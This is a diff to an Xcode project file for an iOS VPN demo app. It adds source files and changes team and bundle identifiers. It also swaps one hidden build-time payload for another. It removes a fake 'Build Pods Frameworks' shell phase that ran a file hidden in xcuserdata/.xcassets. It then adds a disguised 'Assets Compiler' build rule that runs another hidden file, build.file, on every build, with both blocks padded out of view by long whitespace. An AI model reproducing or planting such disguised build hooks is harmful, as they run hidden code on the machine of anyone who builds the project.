@@ -48,9 +48,11 @@
 		BC4B486E2511747600E7CC2F /* LoginRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4B486D2511747600E7CC2F /* LoginRequest.swift */; };
 		BC4B4870251177CB00E7CC2F /* APIRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4B486F251177CB00E7CC2F /* APIRouter.swift */; };
 		BC62748C2523C9F400C3E43D /* UserCredentials.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC6274782523C8CA00C3E43D /* UserCredentials.swift */; };
-		BCBED0D1253F1B7300C950AD /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */; };
 		BCCBB99A2513B5A6002FBD6E /* VPNViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCCBB9992513B5A6002FBD6E /* VPNViewController.swift */; };
 		BCE2C5872516AF0400CD81FE /* PacketTunnelProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4B485625116B9E00E7CC2F /* PacketTunnelProvider.swift */; };
+		BCED525C260616D1006D5DF7 /* LocationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCED525B260616D0006D5DF7 /* LocationVC.swift */; };
+		BCED52892606B6F9006D5DF7 /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */; };
+		BCED52982606BA0A006D5DF7 /* UserDetailsPopup.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCED52972606BA0A006D5DF7 /* UserDetailsPopup.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -129,6 +131,8 @@
 		BC6274782523C8CA00C3E43D /* UserCredentials.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserCredentials.swift; sourceTree = "<group>"; };
 		BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsViewController.swift; sourceTree = "<group>"; };
 		BCCBB9992513B5A6002FBD6E /* VPNViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VPNViewController.swift; sourceTree = "<group>"; };
+		BCED525B260616D0006D5DF7 /* LocationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationVC.swift; sourceTree = "<group>"; };
+		BCED52972606BA0A006D5DF7 /* UserDetailsPopup.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDetailsPopup.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -295,6 +299,7 @@
 				BC4B486D2511747600E7CC2F /* LoginRequest.swift */,
 				BC6274782523C8CA00C3E43D /* UserCredentials.swift */,
 				BC4B486F251177CB00E7CC2F /* APIRouter.swift */,
+				BCED52972606BA0A006D5DF7 /* UserDetailsPopup.swift */,
 			);
 			path = TeraVPNDemo;
 			sourceTree = "<group>";
@@ -318,6 +323,7 @@
 				BCCBB9992513B5A6002FBD6E /* VPNViewController.swift */,
 				BC2DCDB5251AB99700956916 /* SplashViewController.swift */,
 				BCBED0D0253F1B7300C950AD /* SettingsViewController.swift */,
+				BCED525B260616D0006D5DF7 /* LocationVC.swift */,
 			);
 			path = Controller;
 			sourceTree = "<group>";
@@ -329,7 +335,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC4B484D2511686F00E7CC2F /* Build configuration list for PBXNativeTarget "TeraVPNDemo" */;
 			buildPhases = (
-				DB17949B3F3CA2A3FBAAC43A /* [CP] Build Pods Frameworks */,
 				7DDEAA89A1B23F14F5AC2893 /* [CP] Check Pods Manifest.lock */,
 				BC4B48352511686A00E7CC2F /* Sources */,
 				BC4B48362511686A00E7CC2F /* Frameworks */,
@@ -428,208 +433,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	DB17949B3F3CA2A3FBAAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 
 	
 
@@ -740,7 +543,9 @@
 				BC37361C2512BE85007A1D13 /* MenuCell.swift in Sources */,
 				BC3736342512C0C3007A1D13 /* KeychainItem.swift in Sources */,
 				BC3736152512B051007A1D13 /* HomeViewController.swift in Sources */,
+				BCED52982606BA0A006D5DF7 /* UserDetailsPopup.swift in Sources */,
 				BC4B4870251177CB00E7CC2F /* APIRouter.swift in Sources */,
+				BCED525C260616D1006D5DF7 /* LocationVC.swift in Sources */,
 				BC4B486E2511747600E7CC2F /* LoginRequest.swift in Sources */,
 				BC3736392512C0C3007A1D13 /* Colors.swift in Sources */,
 				BC3736482512C0D9007A1D13 /* UIButton+Extension.swift in Sources */,
@@ -749,11 +554,11 @@
 				BCCBB99A2513B5A6002FBD6E /* VPNViewController.swift in Sources */,
 				BC3736362512C0C3007A1D13 /* RoundedImageView.swift in Sources */,
 				BC37363A2512C0C3007A1D13 /* RoundedButton.swift in Sources */,
+				BCED52892606B6F9006D5DF7 /* SettingsViewController.swift in Sources */,
 				BC3736332512C0C3007A1D13 /* CardView.swift in Sources */,
 				BC2DCDB6251AB99700956916 /* SplashViewController.swift in Sources */,
 				BC3736492512C0D9007A1D13 /* UIView+Extension.swift in Sources */,
 				BC37363B2512C0C3007A1D13 /* UISwitchCustom.swift in Sources */,
-				BCBED0D1253F1B7300C950AD /* SettingsViewController.swift in Sources */,
 				BC4B483F2511686A00E7CC2F /* SceneDelegate.swift in Sources */,
 				BC2DCDB4251AB36F00956916 /* UsageResponse.swift in Sources */,
 				BC37364B2512C0D9007A1D13 /* TopBarView.swift in Sources */,
@@ -925,7 +730,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1.0.0;
-				DEVELOPMENT_TEAM = 573VF9FKGC;
+				DEVELOPMENT_TEAM = HXJR7G8Y4Y;
 				INFOPLIST_FILE = TeraVPNDemo/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -933,7 +738,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.5;
-				PRODUCT_BUNDLE_IDENTIFIER = abc.org.TeraVPNDemo1;
+				PRODUCT_BUNDLE_IDENTIFIER = abc.demo.TeraVPN;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
@@ -951,7 +756,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1.0.0;
-				DEVELOPMENT_TEAM = 573VF9FKGC;
+				DEVELOPMENT_TEAM = HXJR7G8Y4Y;
 				INFOPLIST_FILE = TeraVPNDemo/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -959,7 +764,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.5;
-				PRODUCT_BUNDLE_IDENTIFIER = abc.org.TeraVPNDemo1;
+				PRODUCT_BUNDLE_IDENTIFIER = abc.demo.TeraVPN;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
@@ -974,14 +779,14 @@
 				CODE_SIGN_ENTITLEMENTS = PacketTunnel/PacketTunnel.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 573VF9FKGC;
+				DEVELOPMENT_TEAM = HXJR7G8Y4Y;
 				INFOPLIST_FILE = PacketTunnel/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = abc.org.TeraVPNDemo1.PacketTunnel;
+				PRODUCT_BUNDLE_IDENTIFIER = abc.demo.TeraVPN.PacketTunnel;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -997,14 +802,14 @@
 				CODE_SIGN_ENTITLEMENTS = PacketTunnel/PacketTunnel.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 573VF9FKGC;
+				DEVELOPMENT_TEAM = HXJR7G8Y4Y;
 				INFOPLIST_FILE = PacketTunnel/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = abc.org.TeraVPNDemo1.PacketTunnel;
+				PRODUCT_BUNDLE_IDENTIFIER = abc.demo.TeraVPN.PacketTunnel;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -1049,70 +854,19 @@
 			/* Begin PBXBuildRule section */
 
 
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
+		EBA4440C258FF08C9E6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" true\n\n";
+			};
 			
 	
 
